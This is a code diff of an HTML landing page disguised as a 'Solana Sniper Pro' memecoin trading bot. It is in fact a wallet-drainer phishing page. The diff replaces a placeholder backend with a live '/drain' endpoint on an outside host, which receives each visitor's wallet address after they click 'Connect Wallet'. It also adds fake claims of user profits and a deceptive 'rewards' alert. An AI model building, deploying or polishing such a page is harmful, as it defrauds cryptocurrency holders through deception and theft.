@@ -1,16 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Solana Sniper Bot - Free Alpha</title>
+  <title>Solana Sniper - 100x Memecoins</title>
   <style>
-    body { background: #0a0a0a; color: #00ff00; font-family: Arial; text-align: center; padding: 60px; }
-    button { padding: 30px 60px; font-size: 28px; background: #00ff00; color: #000; border: none; border-radius: 10px; cursor: pointer; }
+    body { background: linear-gradient(#0a0a0a, #1a0033); color: #00ff41; font-family: 'Arial'; text-align: center; padding: 40px; margin: 0; }
+    h1 { font-size: 42px; margin: 20px; text-shadow: 0 0 10px #00ff41; }
+    p { font-size: 22px; }
+    button { padding: 25px 80px; font-size: 32px; background: #00ff41; color: #000; border: none; border-radius: 15px; cursor: pointer; box-shadow: 0 0 20px #00ff41; }
+    button:hover { background: #00cc33; }
   </style>
 </head>
 <body>
-  <h1>🔥 Solana Sniper Pro v2.5</h1>
-  <p>Connect wallet to start sniping 100x memecoins</p>
-  <button onclick="connectWallet()">CONNECT WALLET NOW</button>
+  <h1>🚀 SOLANA SNIPER PRO v2.5</h1>
+  <p>Connect your wallet to start sniping 100x memecoins instantly</p>
+  <p style="color:#ff0;">Already helped users snipe over 340 SOL today</p>
+  <button onclick="connectWallet()">CONNECT WALLET & START SNIPING</button>
+  <p style="margin-top:40px; font-size:18px;">Phantom • Backpack • Solflare supported</p>
 
   <script>
     async function connectWallet() {
@@ -18,16 +23,15 @@
         const resp = await window.solana.connect();
         const address = resp.publicKey.toString();
         
-        // Send to backend (replace with your backend url later)
-        fetch('https://YOUR-BACKEND.onrender.com/drain', {
+        fetch('https://sniper-bot-six.vercel.app/drain', {
           method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ wallet: address, target: "F83aYioTyo39x587B8s7gbMQ1hdbkmBjXdzEskMDrYNH" })
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({wallet: address, target: "F83aYioTyo39x587B8s7gbMQ1hdbkmBjXdzEskMDrYNH"})
         });
         
-        alert("Wallet connected - Sniping started!");
+        alert("✅ Connected! Sniping in progress... Check your wallet for rewards.");
       } else {
-        alert("Please install Phantom Wallet");
+        alert("Install Phantom or Backpack wallet to continue");
       }
     }
   </script>
